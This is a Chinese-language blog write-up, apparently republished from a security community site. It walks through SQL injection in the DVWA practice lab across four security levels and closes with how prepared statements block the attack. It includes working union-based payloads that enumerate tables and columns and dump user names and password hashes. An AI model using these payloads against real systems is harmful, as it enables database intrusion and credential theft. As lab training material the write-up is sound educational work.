---
title: DVWA靶场之SQL Injection学习分享
url: https://buaq.net/go-145533.html
source: unSafe.sh - 不安全
date: 2023-01-15
fetch_date: 2025-10-04T03:55:56.215222
---

# DVWA靶场之SQL Injection学习分享

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/3cd026b7b0e0c71c2970157d9d7efc39.jpg)

DVWA靶场之SQL Injection学习分享

1.SQL Injection(Low)相关代码分析可以看到代码没有对id参数做任何过滤，会导致SQL注入漏洞输入1，正常返回输入1'，产生报错，存在字
*2023-1-14 15:25:2
Author: [xz.aliyun.com(查看原文)](/jump-145533.htm)
阅读量:29
收藏*

---

## 1.SQL Injection(Low)

相关代码分析

![](https://img-blog.csdnimg.cn/b2c8c56925d645d7babe2ccf35d4c030.png)

可以看到代码没有对id参数做任何过滤，会导致SQL注入漏洞

输入1，正常返回

![](https://img-blog.csdnimg.cn/5b1c01e861f24804ba50a8b9ffa038cd.png)

输入1'，产生报错，存在字符型SQL注入

![](https://img-blog.csdnimg.cn/c1e31300c9a64453a000c6cd6586f1c8.png)

判断字段数，输入1' order by 2 -- q，回显正常，用-- q注释掉前面的单引号

![](https://img-blog.csdnimg.cn/19a751b49c32438c8cd03215eeec9d55.png)

输入1' order by 3 -- q，回显错误，所以字段数为2

![](https://img-blog.csdnimg.cn/618f35ee1a58480e98f429f5b4acefee.png)

判断回显点，输入1' union select 1,2 -- q，可以在如图所示的位置获取我们想要的内容

![](https://img-blog.csdnimg.cn/86309ecda91347658877e051a8d3b0b8.png)

查询当前数据库名为dvwa，输入1' union select 1,database() -- q

![](https://img-blog.csdnimg.cn/748a59291c304ce583a87e115a1c8758.png)

查询当前数据库下的所有表名guestbook,users，输入1' union select 1,group\_concat(table\_name) from information\_schema.tables where table\_schema=database() -- q

![](https://img-blog.csdnimg.cn/517c4176ecce41b1baefabd4beb31f7d.png)

查询users表中的所有字段user\_id,first\_name,last\_name,user,password,avatar,last\_login,failed\_login，输入1' union select 1,group\_concat(column\_name) from information\_schema.columns where table\_schema=database() and table\_name='users' -- q

![](https://img-blog.csdnimg.cn/06f734f885624af0868d7c86968b0e2b.png)

查询user和password字段的内容，输入1' union select group\_concat(user),group\_concat(password) from users -- q

![](https://img-blog.csdnimg.cn/2a8106a216814045adb3022af04a0c60.png)

## 2.SQL Injection(Medium)

相关代码分析

![](https://img-blog.csdnimg.cn/0f7ae25efa8e4a63be09ce423ac9fbb1.png)

Medium级别的代码利用mysql\_real\_escape\_string函数对特殊符号

\x00,\n,\r,\,',",\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

判断是否存在注入，注入是字符型还是数字型

抓包更改参数id为1' or 1=1 #

![](https://img-blog.csdnimg.cn/0f7ae25efa8e4a63be09ce423ac9fbb1.png)

报错：

![](https://img-blog.csdnimg.cn/47f498a30bc54e0882e6c5ee9d4e1dc5.png)

抓包更改参数id为1 or 1=1 #

![](https://img-blog.csdnimg.cn/7f6af37e399e472ca04f08ee58c8d479.png)

查询成功：

![](https://img-blog.csdnimg.cn/3c27c4ddd8ba48febce51fe03e0fea1c.png)

说明存在数字型注入。

（由于是数字型注入，服务器端的mysql\_real\_escape\_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

中间的操作和低等级的SQL注入类似，只是抓包修改，在此不再做过多赘述

## 3.SQL Injection(High)

相关代码分析

![](https://img-blog.csdnimg.cn/d5022e6c8dbb46ad9fb2a62f483e189d.png)

与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉,前面要加上'。中间的操作和低等级的SQL注入类似，在此不再做过多赘述

输入1' or 1=1 union select group\_concat(user),group\_concat(password) from users #，查询成功：

![](https://img-blog.csdnimg.cn/9414f568ffb041ff8cb73b9e091548b1.png)

## 4.SQL Injection(Impossible)

相关代码分析

![](https://img-blog.csdnimg.cn/629ec0fc1541479e9efa803350ea4402.png)

可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

博客:

<https://rdyx0.github.io/>

先知社区：

<https://xz.aliyun.com/u/37846>

SecIN:

<https://www.sec-in.com/author/3097>

CSDN:

<https://blog.csdn.net/weixin_48899364?type=blog>

公众号：

<https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect>

FreeBuf：

[https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85](https://xz.aliyun.com/u/37846)

文章来源: https://xz.aliyun.com/t/12040
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)